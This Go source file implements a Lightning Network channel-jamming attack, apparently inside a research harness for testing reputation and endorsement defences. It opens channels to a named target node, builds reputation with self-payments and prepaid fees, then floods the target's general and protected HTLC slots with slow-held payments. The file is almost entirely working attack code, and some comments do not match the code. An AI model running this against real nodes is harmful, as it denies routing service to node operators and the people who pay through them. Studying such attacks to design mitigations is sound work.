package main

import (
	"context"
	"fmt"
	"log"
	"sync"
	"time"

	"github.com/lightninglabs/lndclient"
	"github.com/lightningnetwork/lnd/funding"
	"github.com/lightningnetwork/lnd/lnrpc"
	"github.com/lightningnetwork/lnd/lnwire"
	"github.com/lightningnetwork/lnd/routing/route"
)

func runAttack(ctx context.Context, graph *GraphHarness,
	jammer *JammingHarness, targetNode route.Vertex,
	targetPeerAlias string) error {

	node, err := graph.LookupByAlias(ctx, targetPeerAlias)
	if err != nil {
		return err
	}

	err = OpenChannels(ctx, graph, targetNode, node.PubKey)
	if err != nil {
		return err
	}

	log.Println("Launching payments to build reputation")
	endorsed, err := BuildReputation(ctx, jammer)
	if err != nil {
		return err
	}

	log.Printf("Reputation building endorsed: %v", endorsed)

	// Get the channel IDs of our last hop channels with the target peer.
	// We'll need these to split our jamming htlcs over the general slots
	// of two channels, because our target isn't guaranteed access to all
	// the protected slots.
	finalSCIDs, err := graph.ListChannelIDs(ctx, 2)
	if err != nil {
		return fmt.Errorf("list channel ids: %w", err)
	}
	if len(finalSCIDs) != 2 {
		return fmt.Errorf("expected 2 channels with peer, got: %v",
			len(finalSCIDs))
	}

	// Once endorsement has been built up, we've at least reached the
	// threshold reputation required to get a htlc endorsed. We'll now
	// take two steps:
	// 1. Slow jam general slots with one of our nodes
	// 2. Build reputation for access to protected slots with the other
	chans, err := slowJamGeneral(ctx, jammer, finalSCIDs[0])
	if err != nil {
		return fmt.Errorf("slow jamming: %w", err)
	}

	// While WIP, cancel these payments back for easier cleanup.
	log.Printf("Dispatched: %v general slow jams over: %v", len(chans),
		finalSCIDs[0].ToUint64())

	var wg sync.WaitGroup

	wg.Add(1)
	go func() {
		defer wg.Done()

		log.Printf("Waiting for: %v general slow jams", len(chans))
		n, err := waitForJams(ctx, chans)
		if err != nil {
			log.Printf("Wait for general jams: %v", err)
		}

		log.Printf("Of %v general jams, %v reached destination",
			len(chans), n)
	}()

	// Get the route we'll use for our protected jamming, using the last
	// channel that was *not* used to jam general.
	jamAmt := lnwire.MilliSatoshi(400_000)
	zeroToTwo, err := jammer.LndNodes.GetNode(0).Client.QueryRoutes(
		ctx,
		lndclient.QueryRoutesRequest{
			PubKey:       jammer.LndNodes.GetNode(2).NodePubkey,
			AmtMsat:      jamAmt,
			FeeLimitMsat: lnwire.MaxMilliSatoshi,
		},
	)
	if err != nil {
		return fmt.Errorf("0 -> 2: %w", err)
	}
	zeroToTwo.Hops[len(zeroToTwo.Hops)-1].ChannelID = finalSCIDs[1].ToUint64()

	log.Print("Paying for reputation to access protected slots")
	err = buildReputationForProtected(ctx, jammer, zeroToTwo, targetNode)
	if err != nil {
		return fmt.Errorf("Build protected reputation: %w", err)
	}

	protectedChans, err := jamProtected(ctx, jammer, zeroToTwo)
	if err != nil {
		return fmt.Errorf("slow jam protected: %w", err)
	}

	log.Printf("Dispatched: %v protected slow jams over: %v", len(chans),
		finalSCIDs[1].ToUint64())

	wg.Add(1)
	go func() {
		defer wg.Done()

		log.Printf("Waiting for: %v protected slow jams", len(protectedChans))
		n, err := waitForJams(ctx, protectedChans)
		if err != nil {
			log.Printf("Wait for protected jams: %v", err)
		}

		log.Printf("Of %v protected jams, %v reached destination",
			len(protectedChans), n)
	}()

	log.Printf("Waiting for slow jams to complete")
	wg.Wait()

	return nil
}

// waitForJams waits for a set of jamming payments to complete. We just wait
// in the order that they were dispatched, as this is the order we'd expect
// them to resolve if the payment reaches the holding party. It's not critical
// if some payments are waiting in this queue to be seen as resolved.
func waitForJams(ctx context.Context, jams []jamPair) (int, error) {
	var (
		err         error
		reachedDest int
	)

	for _, jam := range jams {
		select {
		case r := <-jam.resp:
			if len(r.Htlcs) > 0 {
				reachedDest++
			}

		// Even if we error out, we want to cancel all of our payments.
		case <-ctx.Done():
			err = ctx.Err()
		}

		close(jam.req.EarlySettle)
	}

	return reachedDest, err
}

type jamPair struct {
	req  JammingPaymentReq
	resp <-chan JammingPaymentResp
}

// LND has some saftey limits that it'll release HTLCs early to prevent
// force closes, take 10 off our final wait to make sure we don't drop
// the HTLCs.
func getSlowJamHold(ctx context.Context, route *lndclient.QueryRoutesResponse,
	j *JammingHarness) (time.Duration, error) {

	absHoldHeight := route.Hops[len(route.Hops)-1].Expiry - 10
	info, err := j.LndNodes.GetNode(0).Client.GetInfo(ctx)
	if err != nil {
		return 0, err
	}

	relativeHold := absHoldHeight - info.BlockHeight

	// Assume 5 minute blocks
	holdTime := time.Duration(relativeHold) * 5 * time.Minute

	// Our goal is to hold for an hour, so we'll pick the minimum.
	if holdTime < time.Minute*10 {
		return holdTime, nil
	}

	return time.Minute * 10, nil
}

func jamProtected(ctx context.Context, j *JammingHarness,
	route *lndclient.QueryRoutesResponse) ([]jamPair, error) {

	wait, err := getSlowJamHold(ctx, route, j)
	if err != nil {
		return nil, err
	}

	var jamChans []jamPair
	for i := 0; i < 483/2; i++ {
		req := JammingPaymentReq{
			AmtMsat:         route.TotalAmtMsat - route.TotalFeesMsat,
			SourceIdx:       0,
			DestIdx:         2,
			EndorseOutgoing: true,
			SettleWait:      wait,
			Settle:          false,
			EarlySettle:     make(chan struct{}),
		}

		if i%50 == 0 && i != 0 {
			log.Printf("Sent %v protected jams", i)
		}

		resp, err := j.JammingPaymentRoute(ctx, req, *route)
		if err != nil {
			return nil, fmt.Errorf("%v - probe: %v", i, err)
		}

		jamChans = append(jamChans, jamPair{
			req:  req,
			resp: resp,
		})
	}

	return jamChans, nil
}

func slowJamGeneral(ctx context.Context, j *JammingHarness,
	lastChannel lnwire.ShortChannelID) ([]jamPair, error) {

	// Just above the dust limit.
	jamAmt := lnwire.MilliSatoshi(400_000)
	oneToTwo, err := j.LndNodes.GetNode(1).Client.QueryRoutes(
		ctx,
		lndclient.QueryRoutesRequest{
			PubKey:       j.LndNodes.GetNode(2).NodePubkey,
			AmtMsat:      jamAmt,
			FeeLimitMsat: lnwire.MaxMilliSatoshi,
		},
	)
	if err != nil {
		return nil, fmt.Errorf("0 -> 2: %w", err)
	}

	oneToTwo.Hops[len(oneToTwo.Hops)-1].ChannelID = lastChannel.ToUint64()

	wait, err := getSlowJamHold(ctx, oneToTwo, j)
	if err != nil {
		return nil, err
	}

	generalSlots := 483 - 483/2
	var jamChans []jamPair
	for i := 0; i < generalSlots; i++ {
		slowJam := JammingPaymentReq{
			AmtMsat:         jamAmt,
			SourceIdx:       1,
			DestIdx:         2,
			EndorseOutgoing: false,
			SettleWait:      wait,
			Settle:          false,
			EarlySettle:     make(chan struct{}),
		}

		if i%50 == 0 && i != 0 {
			log.Printf("Sent %v general jams", i)
		}

		resp, err := j.JammingPaymentRoute(ctx, slowJam, *oneToTwo)
		if err != nil {
			return nil, fmt.Errorf("%v - probe: %v", i, err)
		}

		jamChans = append(jamChans, jamPair{
			req:  slowJam,
			resp: resp,
		})
	}

	return jamChans, nil
}

type paymentReport struct {
	dispatchedPmts int
	targetFailed   int
	peerFailed     int
	htlcReceived   int
}

func (p *paymentReport) reportResponse(i int, r JammingPaymentResp) error {
	if r.SendFailure == lnrpc.PaymentFailureReason_FAILURE_REASON_NONE {
		return fmt.Errorf("Probe: %v not failed back", i)
	}

	if len(r.FailureIdx) == 0 {
		return fmt.Errorf("Probe: %v has no failed htlcs", i)
	}

	for _, idx := range r.FailureIdx {
		switch idx {
		case 0:
			return fmt.Errorf("Probe: %v failed at source", i)

		case 1:
			p.targetFailed++

		case 2:
			p.peerFailed++

		case 3:
			p.htlcReceived++

		default:
			return fmt.Errorf("unexpected failure index: %v", idx)
		}
	}

	return nil
}

func (p *paymentReport) String() string {
	return fmt.Sprintf("%v sent, target failed: %v peer failed: %v, "+
		"reached attacker: %v", p.dispatchedPmts, p.targetFailed,
		p.peerFailed, p.htlcReceived)
}

func buildReputationForProtected(ctx context.Context, j *JammingHarness,
	route *lndclient.QueryRoutesResponse, target route.Vertex) error {

	var (
		// In our first round, we'll just pay enough for a few htlcs to
		// get protected access. We don't want to overpay for htlcs
		// that won't go through due to liquidity concerns.
		htlcToPay       = 10
		htlcsPaidFor    = 0
		prevReachedDest = 0
	)

	for {
		err := prepayHTLCs(ctx, j, htlcToPay, route, target)
		if err != nil {
			return err
		}

		htlcsPaidFor += htlcToPay

		result, err := probeProtectedAccess(ctx, j, route)
		if err != nil {
			return err
		}

		log.Printf("Protected probes: %v. Total paid "+
			"for: %v", result, htlcsPaidFor)

		// We don't want to keep paying for reputation if our htlcs
		// aren't going to get through due to liquidity constraints.
		// Check that we're still getting more htlcs through than our
		// last attempt, and exit if not (the issue is no longer
		// reputation if paying more doesn't increase our success).
		if result.htlcReceived <= prevReachedDest {
			log.Printf("Exiting protected probing: %v received +"+
				"<= %v on previous attempt",
				result.htlcReceived, prevReachedDest)
		}
		prevReachedDest = result.htlcReceived

		// If any HTLCs failed at the target node, it may be because:
		// 1. We don't have sufficient reputation
		// 2. The node does not have enough liquidity
		//
		// We continue to gradually pay for htlcs to build more
		// reputation to gain access to htlc slots.
		htlcToPay = result.targetFailed
		if htlcToPay > 30 {
			htlcToPay = 30
		}

		if htlcToPay == 0 {
			log.Print("No htlcs failed at target, prepay complete")
			return nil
		}
	}
}

// probeProtectedAccess sends a set of probes over the route provided to check
// how much access we have to protected slots on the targeted channel.
//
// This function assumes that the general slots on the target channel have
// already been jammed so that we can focus on the protected slots.
func probeProtectedAccess(ctx context.Context, j *JammingHarness,
	route *lndclient.QueryRoutesResponse) (*paymentReport,
	error) {

	var (
		protected   = 483 / 2
		respChans   []<-chan JammingPaymentResp
		cancelChans []chan struct{}
	)

	timeout := time.Tick(time.Minute)
	var results paymentReport

	for i := 0; i < protected; i++ {
		cancel := make(chan struct{})
		cancelChans = append(cancelChans, cancel)

		req0 := JammingPaymentReq{
			AmtMsat:         route.TotalAmtMsat - route.TotalFeesMsat,
			SourceIdx:       0,
			DestIdx:         2,
			EndorseOutgoing: true,
			EarlySettle:     cancel,
			SettleWait:      time.Minute,
			Settle:          false,
		}

		resp, err := j.JammingPaymentRoute(ctx, req0, *route)
		if err != nil {
			return nil, fmt.Errorf("probe: %v failed: %v", i, err)
		}
		respChans = append(respChans, resp)

		results.dispatchedPmts++
	}

	for i, resp := range respChans {
		select {
		// Do *not* risk reputation here, abort everything if we get
		// near our threshold.
		case <-timeout:
			for _, c := range cancelChans {
				close(c)
			}

			// Once we've ticked once, replace with another channel
			// that will never have a result so we don't hit this
			// branch anymore.
			timeout = make(<-chan time.Time)

		case r := <-resp:
			if r.Err != nil {
				return nil, fmt.Errorf("Probe: %v failed: %v", i, r.Err)
			}

			if err := results.reportResponse(i, r); err != nil {
				return nil, err
			}
		}
	}

	return &results, nil
}

func prepayHTLCs(ctx context.Context, j *JammingHarness, n int,
	prepayRoute *lndclient.QueryRoutesResponse, target route.Vertex) error {

	costPerHTLC, err := getHTLCPrepay(prepayRoute.Hops, target)
	if err != nil {
		return fmt.Errorf("cost per htlc: %w", err)
	}

	totalPayable := costPerHTLC * lnwire.MilliSatoshi(n)

	log.Printf("Paying HTLC opportunity cost: %v for %v HTLCs",
		costPerHTLC, n)

	// Get the route we'll use to build reputation, which is between our
	// own nodes so we don't inflate the value of other links.
	pmtAmt := lnwire.MilliSatoshi(555_000_000)
	route, err := j.LndNodes.GetNode(0).Client.QueryRoutes(
		ctx,
		lndclient.QueryRoutesRequest{
			PubKey:       j.LndNodes.GetNode(1).NodePubkey,
			AmtMsat:      pmtAmt,
			FeeLimitMsat: lnwire.MaxMilliSatoshi,
		},
	)
	if err != nil {
		return fmt.Errorf("0 -> 1: %w", err)
	}

	req0 := JammingPaymentReq{
		AmtMsat:   pmtAmt,
		SourceIdx: 0,
		DestIdx:   1,
		// We don't need to endorse because we get reputation for fast
		// resolution.
		EndorseOutgoing: false,
		Settle:          true,
	}

	// TODO: we shouldn't allow overpayment to contribute to reputation,
	// but for now we can save ourselves the hassle of multiple payments.
	for _, hop := range route.Hops {
		if *hop.PubKey == target {
			hop.FeeMsat += totalPayable
		}
	}
	route.TotalFeesMsat += totalPayable
	route.TotalAmtMsat += totalPayable

	log.Printf("Prepaying: %v fee on amount %v with %v per payment", totalPayable,
		route.TotalAmtMsat, route.TotalFeesMsat)

	resp0, err := j.JammingPaymentRoute(ctx, req0, *route)
	if err != nil {
		return fmt.Errorf("0->1: %w", err)
	}

	select {
	case resp := <-resp0:
		if resp.SendFailure != lnrpc.PaymentFailureReason_FAILURE_REASON_NONE {
			return fmt.Errorf("prepay failed: %v",
				resp.SendFailure)
		}

	case <-ctx.Done():
		return ctx.Err()
	}

	return nil
}

func getHTLCPrepay(route []*lndclient.Hop, target route.Vertex) (
	lnwire.MilliSatoshi, error) {

	var (
		targetIncomingHop *lndclient.Hop
		targetOutgoingHop *lndclient.Hop
	)
	for _, hop := range route {
		// If we've just set our incoming hop, the next one is our
		// outgoing hop.
		if targetIncomingHop != nil {
			targetOutgoingHop = hop
			break
		}

		// TODO: if pubkey isn't set in hops we need further lookups.
		if *hop.PubKey == target {
			targetIncomingHop = hop
		}
	}

	if targetIncomingHop == nil {
		return 0, fmt.Errorf("could not find incoming target hop in: %v"+
			"for node: %v", route, target)
	}

	if targetOutgoingHop == nil {
		return 0, fmt.Errorf("could not find outgoing target hop in: %v"+
			"for node: %v", route, target)
	}

	fee := targetIncomingHop.FeeMsat
	cltvDelta := targetIncomingHop.Expiry - targetOutgoingHop.Expiry
	periods := (cltvDelta * 5 * 60) / 90 // assume 5 min blocks, 90s period
	oc := fee * lnwire.MilliSatoshi(periods)

	log.Printf("opportunity cost: %v for fee: %v with delta: %v over %v "+
		"periods", oc, fee, cltvDelta, periods)

	return oc, nil
}

// BuildReputation sends payments between LND0 and LND1, proving to determine
// whether it has sufficient reputation to get endorsed over Target -> Peer
// occasionally.
func BuildReputation(ctx context.Context, j *JammingHarness) (bool,
	error) {

	// First, we'll query some routes so that we don't have to waste time
	// on pathfinding:
	// - To build reputation: LND0 -> LND1 / LND1 -> LND0
	// - To probe endorsement: LND0 -> LND2 (via target/peer)
	amt_msat := lnwire.MilliSatoshi(500_000_000)
	zeroToOne, err := j.LndNodes.GetNode(0).Client.QueryRoutes(
		ctx,
		lndclient.QueryRoutesRequest{
			PubKey:       j.LndNodes.GetNode(1).NodePubkey,
			AmtMsat:      amt_msat,
			FeeLimitMsat: lnwire.MaxMilliSatoshi,
		},
	)
	if err != nil {
		return false, fmt.Errorf("0 -> 1: %w", err)
	}

	oneToZero, err := j.LndNodes.GetNode(1).Client.QueryRoutes(
		ctx,
		lndclient.QueryRoutesRequest{
			PubKey:       j.LndNodes.GetNode(0).NodePubkey,
			AmtMsat:      amt_msat,
			FeeLimitMsat: lnwire.MaxMilliSatoshi,
		},
	)
	if err != nil {
		return false, fmt.Errorf("1 -> 0: %w", err)
	}

	// Just above the dust limit.
	probeAmt := lnwire.MilliSatoshi(400_000)
	zeroToTwo, err := j.LndNodes.GetNode(0).Client.QueryRoutes(
		ctx,
		lndclient.QueryRoutesRequest{
			PubKey:       j.LndNodes.GetNode(2).NodePubkey,
			AmtMsat:      probeAmt,
			FeeLimitMsat: lnwire.MaxMilliSatoshi,
		},
	)
	if err != nil {
		return false, fmt.Errorf("0 -> 2: %w", err)
	}

	var (
		i        int
		feesPaid lnwire.MilliSatoshi
	)
	for {
		log.Printf("Sending reputation payment: %v, total fees: %v",
			i, feesPaid)

		// Fire two fast-resolving, successful payments. We don't
		// endorse them because there's only risk (our gain is the same
		// on quick success).
		req0 := JammingPaymentReq{
			AmtMsat:         amt_msat,
			SourceIdx:       0,
			DestIdx:         1,
			EndorseOutgoing: false,
			Settle:          true,
		}
		resp0, err := j.JammingPaymentRoute(ctx, req0, *zeroToOne)
		if err != nil {
			return false, fmt.Errorf("%v - 0: %v", i, err)
		}

		req1 := JammingPaymentReq{
			AmtMsat:         amt_msat,
			SourceIdx:       1,
			DestIdx:         0,
			EndorseOutgoing: false,
			Settle:          true,
		}

		resp1, err := j.JammingPaymentRoute(ctx, req1, *oneToZero)
		if err != nil {
			return false, fmt.Errorf("%v - 1: %v", i, err)
		}

		// Consume both results, we almost always expect these to
		// succeed so we don't bother with much handling here.
		for i := 0; i < 2; i++ {
			select {
			case r0 := <-resp0:
				if r0.Err != nil {
					return false, err
				}

				if r0.SendFailure != lnrpc.PaymentFailureReason_FAILURE_REASON_NONE {
					log.Printf("%v: 1->0 failed: %v",
						i, r0.SendFailure)
				} else {
					feesPaid += zeroToOne.TotalFeesMsat
				}

			case r1 := <-resp1:
				if r1.Err != nil {
					return false, err
				}

				if r1.SendFailure != lnrpc.PaymentFailureReason_FAILURE_REASON_NONE {
					log.Printf("%v: 0->1 failed: %v",
						i, r1.SendFailure)
				} else {
					feesPaid += oneToZero.TotalFeesMsat
				}

			case <-ctx.Done():
				return false, ctx.Err()
			}
		}

		// We don't need to probe every time, tradeoff overpayment with
		// speed.
		if i%10 != 0 {
			i++
			continue
		}

		// Next, we send a payment to probe whether we have sufficient
		// reputation to get endorsed by our peer. Don't risk the
		// payment taking too long, so set a short timeout.
		probeReq := JammingPaymentReq{
			AmtMsat:         probeAmt,
			SourceIdx:       0,
			DestIdx:         2,
			EndorseOutgoing: true,
			SettleWait:      time.Second * 15,
			Settle:          false,
		}

		log.Printf("Sending endorsement probe: %v", i)
		resp, err := j.JammingPaymentRoute(ctx, probeReq, *zeroToTwo)
		if err != nil {
			return false, fmt.Errorf("%v - probe: %v", i, err)
		}

		select {
		case r := <-resp:
			if r.Err != nil {
				return false, r.Err
			}

			if r.SendFailure != lnrpc.PaymentFailureReason_FAILURE_REASON_NONE {
				log.Printf("%v: probe payment failure: %v",
					i, r.SendFailure)
			}

			// If any htlcs get through endorsed consider base
			// reputation to be built.
			for _, htlc := range r.Htlcs {
				if htlc.IncomingEndorsed {
					return true, nil
				}
			}

		case <-ctx.Done():
			return false, ctx.Err()
		}

		// Give up after 1000 attempts - it's possible that our target
		// does not have good reputation with their peer and then we'll
		// never get a successful probe.
		if i == 100_000 {
			return false, nil
		}

		i++
	}
}

// OpenChannels opens a set of channels that can be used to build reputation
// with a target node for use over its channel with the target peer provided.
// This function assumes that the target and its peers are directly connected
// with *one* channel.
//
// Given: Target --- Peer
// Note: == represents two channels, -- represents one
//
// This function will open channels as follows:
//
//	   LND0
//		|
//
//	   Target --- Peer === LND2
//
//		|
//	    LND1
func OpenChannels(ctx context.Context, graph *GraphHarness, targetNode,
	targetPeer route.Vertex) error {

	// LND0 -> Target
	chanCap := funding.MaxBtcFundingAmount
	chan1, err := graph.OpenChannel(ctx, OpenChannelReq{
		Source:      0,
		Dest:        targetNode,
		CapacitySat: chanCap,
		PushAmt:     chanCap / 2,
	})
	if err != nil {
		return fmt.Errorf("LND-0 -> target: %v", err)
	}

	log.Printf("Opened channel with target node (%s) from LND-0", targetNode)

	// LND-1 -> Target
	chan2, err := graph.OpenChannel(ctx, OpenChannelReq{
		Source:      1,
		Dest:        targetNode,
		CapacitySat: chanCap,
		PushAmt:     chanCap / 2,
	})
	if err != nil {
		return fmt.Errorf("LND-1 -> target: %v", err)
	}

	log.Printf("Opened channel with target node (%s) from LND-1", targetNode)

	// LND-2 -> Peer x2
	req := OpenChannelReq{
		Source:      2,
		Dest:        targetPeer,
		CapacitySat: chanCap,
		// We still give ourselves some liquidity so that we don't
		// run into fee spike buffer issues.
		PushAmt: chanCap / 2,
	}
	chan3, err := graph.OpenChannel(ctx, req)
	if err != nil {
		return fmt.Errorf("LND-2 -> target peer: %v", err)
	}
	log.Printf("Opened channel 1 with target peer (%s) from LND-2",
		targetPeer)

	chan4, err := graph.OpenChannel(ctx, req)
	if err != nil {
		return fmt.Errorf("LND-2 -> target peer: %v", err)
	}
	log.Printf("Opened channel 2 with target peer (%s) from LND-2",
		targetPeer)

	// Wait for channels to reflect in graphs.
	fmt.Println("Waiting for channels to reflect in graphs")
	graph.WaitForChannel(ctx, 1, 0, chan1)
	graph.WaitForChannel(ctx, 2, 0, chan1)

	graph.WaitForChannel(ctx, 0, 1, chan2)
	graph.WaitForChannel(ctx, 2, 1, chan2)

	graph.WaitForChannel(ctx, 0, 2, chan3)
	graph.WaitForChannel(ctx, 1, 2, chan3)

	graph.WaitForChannel(ctx, 0, 2, chan4)
	graph.WaitForChannel(ctx, 1, 2, chan4)

	return nil
}
